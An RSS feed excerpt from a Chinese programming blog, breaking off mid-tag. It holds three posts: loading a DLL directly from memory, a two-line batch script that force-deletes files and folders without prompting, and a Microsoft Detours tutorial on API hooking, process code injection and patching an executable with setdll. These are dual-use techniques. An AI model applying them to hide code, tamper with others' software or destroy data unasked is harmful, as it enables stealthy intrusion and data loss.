;&lt;br&gt;}&lt;/p&gt;</description></item><item><title>从内存中加载动态库(一)</title><link>https://blogs.qipai360.cn/post/loading-dynamic-library-from-memory-part-1/</link><pubDate>Thu, 17 Jul 2008 18:42:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/loading-dynamic-library-from-memory-part-1/</guid><description>&lt;p&gt;程序使用动态库DLL一般分为隐式加载和显式加载两种，分别对应两种链接情况。本文主要讨论显式加载的技术问题。我们知道，要显式加载一个DLL，并取得其中导出的函数地址一般是通过如下步骤：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (1) 用LoadLibrary加载dll文件，获得该dll的模块句柄；&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (2) 定义一个函数指针类型，并声明一个变量；&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (3) 用GetProcAddress取得该dll中目标函数的地址，赋值给函数指针变量；&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (4) 调用函数指针变量。 &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 这个方法要求dll文件位于硬盘上面。现在假设我们的dll已经位于内存中，比如通过脱壳、解密或者解压缩得到，能不能不把它写入硬盘文件，而直接从内存加载呢？答案是肯定的。经过多天的研究，非法操作了N次，修改了M个BUG，死亡了若干脑细胞后，终于有了初步的结果，下面做个总结与大家共享。 &lt;p&gt;一、加载的步骤 &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 由于没有相关的资料说明，只能凭借感觉来写。首先LoadLibrary是把dll的代码映射到exe进程的虚拟地址空间中，我们要实现的也是这个。所以先要弄清楚dll的文件结构。好在这个比较简单，它和exe一样也是PE文件结构，关于PE文件的资料很多，阅读一番后，基本上知道了必须做的几个工作：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (1)判断内存数据是否是一个有效的DLL。这个功能通过函数CheckDataValide完成。原型是：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int DataLength);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (2)计算加载该DLL所需的虚拟内存大小。这个功能通过函数CalcTotalImageSize完成。原型是：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; int CMemLoadDll::CalcTotalImageSize();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (3)将DLL数据复制到所分配的虚拟内存块中。该功能通过函数CopyDllDatas完成。要注意段对齐。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; void CMemLoadDll::CopyDllDatas(void* pDest, void* pSrc);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (4)修正基地重定位数据。这个功能通过函数DoRelocation完成。原型是：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; void CMemLoadDll::DoRelocation( void *NewBase);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (5)填充该DLL的引入地址表。这个功能由函数FillRavAddress完成。原型是：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; BOOL CMemLoadDll::FillRavAddress(void *pImageBase);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (6)根据DLL每个节的属性设置其对应内存页的读写属性。我这里做了简化，所有内存区域都设置成一样的读写属性。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (7)调用入口函数DllMain，完成初始化工作。这一步我一开始忽略了，所以总是发现自己加载的dll和LoadLibrary加载的dll有些不同(我把整块内存区域保存到两个文件中进行比较，够晕的)。只是最近猜想到还需要这一步。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (8)保存dll的基地址（即分配的内存块起始地址）,用于查找dll的导出函数。从现在开始这个dll已经完全映射到了进程的虚拟地址空间，可以使用它了。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (9)不需要dll的时候，释放所分配的虚拟内存。 &lt;p&gt;二、要说明的几个问题 &lt;p&gt;&amp;nbsp;&amp;nbsp; (1)目前CMemLoadDll仅仅针对win32 动态库，没有考虑mfc常规和扩展dll。&lt;br&gt;&amp;nbsp;&amp;nbsp; (2)只考虑使用dll中的函数，对于导出类的dll，由于通常都是隐式链接，所以也没有考虑。导出变量的dll虽然也是隐式链接，但是通过查找函数的方法也可以找到该变量，不过在取值的时候一定要符合dll中对变量的定义，比如dll中导出的是一个int变量，则得到该变量在dll中的地址后，需要强制转换成int*指针，然后取值。&lt;br&gt;&amp;nbsp;&amp;nbsp; (3)查找函数的功能通过函数&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; FARPROC&amp;nbsp; CMemLoadDll::MemGetProcAddress(LPCSTR lpProcName);&lt;br&gt;实现，参数是dll导出的函数（或者变量）的名字。这里必须注意函数名修饰，通常不加extern"C"的函数，编译以后在dll中导出的都是修饰名，比如：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在dll头文件中: extern __declspec(dllexport) int nTestDll;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在.dll中的导出符号变成 &lt;a href="mailto:?nTestDll@@3HA"&gt;?nTestDll@@3HA&lt;/a&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; 所以，为了能够找到我们需要的函数，必须在.h中添加extern "C"修饰。最好是给dll加一个def文件，里面明确给出每个函数的导出名字。&lt;br&gt;&amp;nbsp;&amp;nbsp; (4)PE中的内容比较多，有些细节没有考虑。比如CheckDataValide函数中没有考虑dll对操作系统版本的要求。&lt;br&gt;&amp;nbsp;&amp;nbsp; (5)PE文件中的节有很多种。可以从节表（或者叫做区块表）中一一找到。而且每个节的属性都不同。例如：.text, .data, .rsrc, .crt等等。由于这个代码基于手头已有的pe文件资料，对于不熟悉的节，在映射dll数据的时候没有考虑是否需要处理。&lt;br&gt;&amp;nbsp;&amp;nbsp; (6)一开始把dll映射到进程的地址空间以后，我试图直接使用GetProcAddress查找函数。最初我认为LoadLibrary返回的HINSTANCE值是0x10000000，把它传递给GetProcAddress可以找到目标函数，而我也把dll映射到0x10000000这个地址，但是当我把这个值传递给GetProcAddress的时候，发现无法找到函数，用GetLastError得到错误码一看是无效句柄的错误，这才明白原来LoadLibrary在加载dll的时候，同时创建了一个句柄放入进程的句柄表，而我们要做这个工作是比较麻烦的，所以只能自己写一个查找函数。&lt;br&gt;&amp;nbsp;&amp;nbsp; (7)释放dll所占据的虚拟内存，原来我使用&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtualFree((LPVOID)pImageBase, 0,MEM_FREE);&lt;br&gt;后来发现有问题，应该使用 VirtualFree((LPVOID)pImageBase, 0, MEM_RELEASE);&lt;br&gt;&amp;nbsp;&amp;nbsp; (8)MemGetProcAddress不仅支持通过函数名查找，还支持通过导出序号查找函数。例如下面的用法：&lt;br&gt; DLLFUNCTION fDll = (DLLFUNCTION)a.MemGetProcAddress((LPCTSTR)1); &lt;p&gt;三、创建测试用的DLL，工程的名字取"TestDll" &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用VC向导创建一个WIN32 DLL工程，里面选择“导出一些符号”，为了测试需要，对源代码进行如下修改：&lt;br&gt; （1）头文件&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // This class is exported from the TestDll.dll&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; class TESTDLL_API CTestDll {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; public:&lt;br&gt; CTestDll(void);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; };&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; extern TESTDLL_API int nTestDll;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; //要修改的地方，添加了extern "C" 和 char *参数：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; extern "C"&amp;nbsp; TESTDLL_API int fnTestDll(char *);&lt;br&gt;&amp;nbsp; （2）cpp文件&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; a. 添加 #include "stdlib.h"&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; b. DllMain中&lt;br&gt;&amp;nbsp; case DLL_PROCESS_DETACH:&lt;br&gt;&amp;nbsp;&amp;nbsp; nTestDll = 12345;&lt;br&gt;&amp;nbsp;&amp;nbsp; break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; c. 初始化变量&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; TESTDLL_API int nTestDll=654321;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; d. 修改函数&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; TESTDLL_API int fnTestDll(char *p)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(p == NULL)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return nTestDll;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return atoi(p);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &lt;p&gt;四、创建测试工程。使用一个dlg工程，测试代码如下： &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 假设 DllNameBuffer里面保存有dll文件的路径&lt;br&gt; CFile f;&lt;br&gt; if(f.Open(DllNameBuffer,CFile::modeRead))&lt;br&gt; {&lt;br&gt;&amp;nbsp; int FileLength = f.GetLength();&lt;br&gt;&amp;nbsp; void *lpBuf = new char[FileLength];&lt;br&gt;&amp;nbsp; f.Read(lpBuf, FileLength);&lt;br&gt;&amp;nbsp; f.Close(); &lt;p&gt;&amp;nbsp; CMemLoadDll a;&lt;br&gt;&amp;nbsp; if(a.MemLoadLibrary(lpBuf, FileLength)) //加载dll到当前进程的地址空间&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; typedef&amp;nbsp; int (*DLLFUNCTION)(char *);&lt;br&gt;&amp;nbsp;&amp;nbsp; DLLFUNCTION fDll = (DLLFUNCTION)a.MemGetProcAddress("fnTestDll");&lt;br&gt;&amp;nbsp;&amp;nbsp; if(fDll != NULL)&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; MessageBox("找到函数！！");&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CString str;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; str.Format("Result is: %d &amp;amp; %d",fDll(NULL), fDll("100"));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; MessageBox(str);&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD err = GetLastError();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CString str;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; str.Format("Error: %d",err);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; MessageBox(str);&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; } &lt;p&gt;&amp;nbsp; delete[] lpBuf;&lt;br&gt; } &lt;p&gt;五、加载类源代码。（在后续贴子里面给出）&lt;/p&gt;</description></item><item><title>强制删除任意文件以及文件夹</title><link>https://blogs.qipai360.cn/post/force-delete-any-file-and-folder/</link><pubDate>Thu, 22 May 2008 10:11:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/force-delete-any-file-and-folder/</guid><description>&lt;p&gt;DEL /F /A /Q \\?\%1 &lt;br&gt;RD /S /Q \\?\%1&lt;br&gt;保存为*.bat &lt;br&gt;将要删除的文件以及文件夹拖到该批处理上。</description></item><item><title>微软研究院Detour开发包之API拦截技术</title><link>https://blogs.qipai360.cn/post/microsoft-detour-api-hooking/</link><pubDate>Fri, 18 Apr 2008 15:19:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/microsoft-detour-api-hooking/</guid><description>&lt;p&gt;我们截获函数执行最直接的目的就是为函数增添功能，修改返回值，或者为调试以及性能测试加入附加的代码，或者截获函数的输入输出作研究，破解使用。通过访 问源代码，我们可以轻而易举的使用重建（Rebuilding）操作系统或者应用程序的方法在它们中间插入新的功能或者做功能扩展。然而，在今天这个商业 化的开发世界里，以及在只有二进制代码发布的系统中，研究人员几乎没有机会可以得到源代码。本文主要讨论Detour在Windows二进制PE文件基础 上的API截获技术。对于Linux平台，作这件事情将会非常的简单，由于最初的操作系统设计者引入了LD_PRELOAD。如果你设置&amp;nbsp; LD_PRELOAD=mylib.so ，那么应用程序在载入 dll时，会先查看mylib.so的符号表，在relocation 的时候会优先 使用mylib.so 里的 symbol 。假如你在mylib.so里有个printf() ，那么这个printf就会替代libc的 printf。 而在mylib.so里的这个printf可以直接访问 libc.so里的printf函数指针来获得真正的 printf的入口地 址。 这样，所有的dll的API HOOK在loader加载dll的时候就已经完成，非常自然，和平台相关的部分全部交给loader去处理。&lt;br&gt;一、&amp;nbsp; Detour开发库：&lt;br&gt;&amp;nbsp; 简介&lt;br&gt;Detours是一个在x86平台上截获任意Win32函数调用的工具库。中断代码可以在运行时动态加载。Detours使用一个无条件转移指令来替换目 标函数的最初几条指令，将控制流转移到一个用户提供的截获函数。而目标函数中的一些指令被保存在一个被称为“trampoline” （译注：英文意为蹦 床，杂技）的函数中，在这里我觉得翻译成目标函数的部分克隆/拷贝比较贴切。这些指令包括目标函数中被替换的代码以及一个重新跳转到目标函数的无条件分 支。而截获函数可以替换目标函数，或者通过执行“trampoline”函数的时候将目标函数作为子程序来调用的办法来扩展功能。&lt;br&gt;Detours是执行时被插入的。内存中的目标函数的代码不是在硬盘上被修改的，因而可以在一个很好的粒度上使得截获二进制函数的执行变得更容易。例如， 一个应用程序执行时加载的DLL中的函数过程可以被插入一段截获代码（detoured），与此同时，这个DLL还可以被其他应用程序按正常情况执行（译 注：也就是按照不被截获的方式执行，因为DLL二进制文件没有被修改，所以发生截获时不会影响其他进程空间加载这个DLL）。不同于DLL的重新链接或者 静态重定向，Detours库中使用的这种中断技术确保不会影响到应用程序中的方法或者系统代码对目标函数的定位。&lt;br&gt;如果其他人为了调试或者在内部使用其他系统检测手段而试图修改二进制代码，Detours将是一个可以普遍使用的开发包。据我所知，Detours是第一 个可以在任意平台上将未修改的目标代码作为一个可以通过“trampoline”调用的子程序来保留的开发包。而以前的系统在逻辑上预先将截获代码放到目 标代码中，而不是将原始的目标代码做为一个普通的子程序来调用。我们独特的“trampoline”设计对于扩展现有的软件的二进制代码是至关重要的。&lt;br&gt;出于使用基本的函数截获功能的目的，Detours同样提供了编辑任何DLL导入表的功能，达到向存在的二进制代码中添加任意数据节表的目的，向一个新进 程或者一个已经运行着的进程中注入一个DLL。一旦向一个进程注入了DLL，这个动态库就可以截获任何Win32函数，不论它是在应用程序中或者在系统库 中。&lt;br&gt;&amp;nbsp; 基本原理&lt;br&gt;1．&amp;nbsp; WIN32进程的内存管理 &lt;br&gt;众所周知，WINDOWS NT实现了虚拟存储器，每一WIN32进程拥有4GB的虚存空间， 关于WIN32进程的虚存结构及其操作的具体细节请参阅WIN32 API手册， 以下仅指出与Detours相关的几点： &lt;br&gt;(1) 进程要执行的指令也放在虚存空间中 &lt;br&gt;(2) 可以使用QueryProtectEx函数把存放指令的页面的权限更改为可读可写可执行，再改写其内容，从而修改正在运行的程序 &lt;br&gt;(3) 可以使用VirtualAllocEx从一个进程为另一正运行的进程分配虚存，再使用 QueryProtectEx函数把页面的权限更改为可读可写可执行，并把要执行的指令以二进制机器码的形式写入，从而为一个正在运行的进程注入任意的代码 。&lt;br&gt;2． 拦截WIN32 API的原理 &lt;br&gt;Detours定义了三个概念：&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; (1) Target函数：要拦截的函数，通常为Windows的API。&lt;br&gt;(2) Trampoline函数：Target函数的部分复制品。因为Detours将会改写Target函数，所以先把Target函数的前5个字节复制保存好，一方面仍然保存Target函数的过程调用语义，另一方面便于以后的恢复。&lt;br&gt;(3) Detour 函数：用来替代Target函数的函数。 &lt;br&gt;Detours在Target函数的开头加入JMP Address_of_ Detour_ Function指令（共5个字节）把对Target函数 的调用引导到自己的Detour函数， 把Target函数的开头的5个字节加上JMP Address_of_ Target _ Function+ 5共10个字节作为Trampoline函数。请参考下面的图1和图2。&lt;br&gt;(图1：Detour函数的过程)&lt;br&gt;&lt;a href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_01_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="460" alt="crack_01" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_01_thumb.jpg" width="620" border="0"&gt;&lt;/a&gt; &lt;br&gt;（图2： Detour函数的调用过程）&lt;br&gt;&lt;a href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_02_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="378" alt="crack_02" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_02_thumb.jpg" width="566" border="0"&gt;&lt;/a&gt; &lt;br&gt;说明：&lt;br&gt;&amp;nbsp; 目标函数：&lt;br&gt;目标函数的函数体（二进制）至少有5个字节以上。按照微软的说明文档Trampoline函数的函数体是拷贝前5个字节加一个无条件跳转指令的话（如果没 有特殊处理不可分割指令的话），那么前5个字节必须是完整指令，也就是不能第5个字节和第6个字节是一条不可分割的指令，否则会造成Trampoline 函数执行错误，一条完整的指令被硬性分割开来，造成程序崩溃。对于第5字节和第6个字节是不可分割指令需要调整拷贝到杂技函数(Trampoline)的 字节个数，这个值可以查看目标函数的汇编代码得到。此函数是目标函数的修改版本，不能在Detour函数中直接调用，需要通过对Trampoline函数 的调用来达到间接调用。&lt;br&gt;&amp;nbsp; Trampoline函数：&lt;br&gt;此函数默认分配了32个字节，函数的内容就是拷贝的目标函数的前5个字节，加上一个JMP Address_of_ Target _ Function+5指令,共10个字节。&lt;br&gt;此函数仅供您的Detour函数调用，执行完前5个字节的指令后再绝对跳转到目标函数的第6个字节继续执行原功能函数。&lt;br&gt;&amp;nbsp; Detour函数：&lt;br&gt;此函数是用户需要的截获API的一个模拟版本，调用方式，参数个数必须和目标函数相一致。如目标函数是__stdcall，则Detour函数声明也必须 是__stdcall,参数个数和类型也必须相同，否则会造成程序崩溃。此函数在程序调用目标函数的第一条指令的时候就会被调用（无条件跳转过来的），如 果在此函数中想继续调用目标函数，必须调用Trampoline函数（Trampoline函数在执行完目标函数的前5个字节的指令后会无条件跳转到目标 函数的5个字节后继续执行），不能再直接调用目标函数，否则将进入无穷递归（目标函数跳转到Detour函数，Detour函数又跳转到目标函数的递归， 因为目标函数在内存中的前5个字节已经被修改成绝对跳转）。通过对Trampoline函数的调用后可以获取目标函数的执行结果，此特性对分析目标函数非 常有用，而且可以将目标函数的输出结果进行修改后再传回给应用程序。&lt;br&gt;Detour提供了向运行中的应用程序注入Detour函数和在二进制文件基础上注入Detour函数两种方式。本章主要讨论第二种工作方式。通过 Detours提供的开发包可以在二进制EXE文件中添加一个名称为Detour的节表，如下图3所示，主要目的是实现PE加载器加载应用程序的时候会自 动加载您编写的Detours DLL，在Detours Dll中的DLLMain中完成对目标函数的Detour。&lt;br&gt;（图3）&lt;br&gt;&lt;a href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_03_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="299" alt="crack_03" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_03_thumb.jpg" width="506" border="0"&gt;&lt;/a&gt; &lt;br&gt;二、&amp;nbsp; Detours提供的截获API的相关接口&lt;br&gt;Detours的提供的API 接口可以作为一个共享DLL给外部程序调用，也可以作为一个静态Lib链接到您的程序内部。&lt;br&gt;Trampoline函数可以动态或者静态的创建，如果目标函数本身是一个链接符号，使用静态的trampoline函数将非常简单。如果目标函数不能在链接时可见，那么可以使用动态trampoline函数。&lt;br&gt;&amp;nbsp; 要使用静态的trampoline函数来截获目标函数，应用程序生成trampoline的时候必须使用&lt;br&gt;DETOUR_TRAMPOLINE宏。DETOUR_TRAMPOLINE有两个输入参数：trampoline的原型和目标函数的名字。&lt;br&gt;注意，对于正确的截获模型，包括目标函数，trampoline函数，以及截获函数都必须是完全一致的调用形式，包括参数格式和调用约定。当通过 trampoline函数调用目标函数的时候拷贝正确参数是截获函数的责任。由于目标函数仅仅是截获函数的一个可调用分支（截获函数可以调用 trampoline函数也可以不调用），这种责任几乎就是一种下意识的行为。&lt;br&gt;使用相同的调用约定可以确保寄存器中的值被正确的保存，并且保证调用堆栈在截获函数调用目标函数的时候能正确的建立和销毁。&lt;br&gt;可以使用DetourFunctionWithTrampoline函数来截获目标函数。这个函数有两个参数：trampoline函数以及截获函数的指针。因为目标函数已经被加到trampoline函数中，所有不需要在参数中特别指定。&lt;br&gt;&amp;nbsp; 我们可以使用DetourFunction函数来创建一个动态的trampoline函数，它包括两个参数：一个指向目标函数的指针和一个截获函数的指针。DetourFunction分配一个新的trampoline函数并将适当的截获代码插入到目标函数中去。&lt;br&gt;当目标函数不是很容易使用的时候，DetourFindFunction函数可以找到那个函数，不管它是DLL中导出的函数，或者是可以通过二进制目标函数的调试符号找到。&lt;br&gt;DetourFindFunction接受两个参数：库的名字和函数的名字。如果DetourFindFunction函数找到了指定的函数，返回该函数 的指针，否则将返回一个NULL指针。DetourFindFunction会首先使用Win32函数LoadLibrary 和 GetProcAddress来定位函数，如果函数没有在DLL的导出表中找到，DetourFindFunction将使用ImageHlp库来搜索有 效的调试符号（译注：这里的调试符号是指Windows本身提供的调试符号，需要单独安装，具体信息请参考Windows的用户诊断支持信息）。 DetourFindFunction返回的函数指针可以用来传递给DetourFunction以生成一个动态的trampoline函数。&lt;br&gt;我们可以调用DetourRemoveTrampoline来去掉对一个目标函数的截获。&lt;br&gt;注意，因为Detours中的函数会修改应用程序的地址空间，请确保当加入截获函数或者去掉截获函数的时候没有其他线程在进程空间中执行，这是程序员的责任。一个简单的方法保证这个时候是单线程执行就是在加载Detours库的时候在DllMain中呼叫函数。&lt;br&gt;三、&amp;nbsp; 使用Detours实现对API的截获的两种方法&lt;br&gt;建立一个MFC对话框工程，在对话框的OK按钮的单击事件中加入对MessageBoxA函数的调用，编译后的程序名称MessageBoxApp,效果如图。&lt;br&gt;&lt;a href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_04_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="322" alt="crack_04" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_04_thumb.jpg" width="476" border="0"&gt;&lt;/a&gt; &lt;br&gt;(图4)&lt;br&gt;&amp;nbsp; 静态方法&lt;br&gt;建立一个Dll工程，名称为ApiHook，这里以Visual C++6.0开发环境，以截获ASCII版本的MessageBoxA函数来说明。在Dll的工程加入：&lt;br&gt;DETOUR_TRAMPOLINE(int WINAPI Real_Messagebox(HWND hWnd ,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpText,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpCaption,&lt;br&gt;UINT uType), ::MessageBoxA);&lt;br&gt;生成一个静态的MessageBoxA的Trampoline函数，在Dll工程中加入目标函数的Detour函数：&lt;br&gt;int WINAPI MessageBox_Mine( HWND hWnd ,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpText,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpCaption,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; UINT uType)&lt;br&gt;{&lt;br&gt;&amp;nbsp; CString tmp= lpText;&lt;br&gt;&amp;nbsp; tmp+=” 被Detour截获”;&lt;br&gt;&amp;nbsp; return Real_Messagebox(hWnd,tmp,lpCaption,uType);&lt;br&gt;//&amp;nbsp; return ::MessageBoxA(hWnd,tmp,lpCaption,uType);&amp;nbsp; //Error &lt;br&gt;}&lt;br&gt;在Dll入口函数中的加载Dll事件中加入：&lt;br&gt;DetourFunctionWithTrampoline((PBYTE)Real_Messagebox, (PBYTE)MessageBox_Mine);&lt;br&gt;在Dll入口函数中的卸载Dll事件中加入：&lt;br&gt;DetourRemove((PBYTE)Real_Messagebox, (PBYTE)MessageBox_Mine);&lt;br&gt;&amp;nbsp; 动态方法&lt;br&gt;建立一个Dll工程，名称为ApiHook，这里以Visual C++6.0开发环境，以截获ASCII版本的MessageBoxA函数来说明。在Dll的工程加入：&lt;br&gt;//声明MessageBoxA一样的函数原型&lt;br&gt;typedef int&amp;nbsp; (WINAPI * MessageBoxSys)( HWND hWnd ,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpText,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpCaption,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; UINT uType);&lt;br&gt;//目标函数指针&lt;br&gt;MessageBoxSys SystemMessageBox=NULL;&lt;br&gt;//Trampoline函数指针&lt;br&gt;MessageBoxSys Real_MessageBox=NULL;&lt;br&gt;在Dll工程中加入目标函数的Detour函数：&lt;br&gt;int WINAPI MessageBox_Mine( HWND hWnd ,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpText,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpCaption,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; UINT uType)&lt;br&gt;{&lt;br&gt;&amp;nbsp; CString tmp= lpText;&lt;br&gt;&amp;nbsp; tmp+=” 被Detour截获”;&lt;br&gt;&amp;nbsp; return Real_Messagebox(hWnd,tmp,lpCaption,uType);&lt;br&gt;//&amp;nbsp; return ::MessageBoxA(hWnd,tmp,lpCaption,uType);&amp;nbsp; //Error &lt;br&gt;}&lt;br&gt;在Dll入口函数中的加载Dll事件中加入：&lt;br&gt;&amp;nbsp; SystemMessageBox=(MessageBoxSys)DetourFindFunction("user32.dll","MessageBoxA");&lt;br&gt;&amp;nbsp; if(SystemMessageBox==NULL)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return FASLE;&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; Real_MessageBox=(MessageBoxSys)DetourFunction((PBYTE)SystemMessageBox, (PBYTE)MessageBox_Mine);&lt;br&gt;在Dll入口函数中的卸载Dll事件中加入：&lt;br&gt;DetourRemove((PBYTE)Real_Messagebox, (PBYTE)MessageBox_Mine);&lt;br&gt;&amp;nbsp; 重写二进制可执行文件&lt;br&gt;使用Detours自带的SetDll.exe重写二进制可执行文件，可以在需要截获的程序中加入一个新的Detours的PE节表。对于本文就是新建一个批处理文件调用SetDll.exe。&lt;br&gt;@echo off&lt;br&gt;if not exist MessageBoxApp.exe (&lt;br&gt;echo 请将文件解压到MessageBoxApp.exe的安装目录, 然后执行补丁程序&lt;br&gt;) else (&lt;br&gt;setdll /d:ApiHook.dll MessageBoxApp.exe&lt;br&gt;)&lt;br&gt;Pause&lt;br&gt;调用后使用depends.exe（微软VC6.0开发包的工具之一）观察MessageBoxApp.exe前后变化， 可以看到Setdll已经重写MessageBoxApp.exe&lt;br&gt;成功，加入了对ApiHook.dll的依赖关系。&lt;br&gt;&lt;a 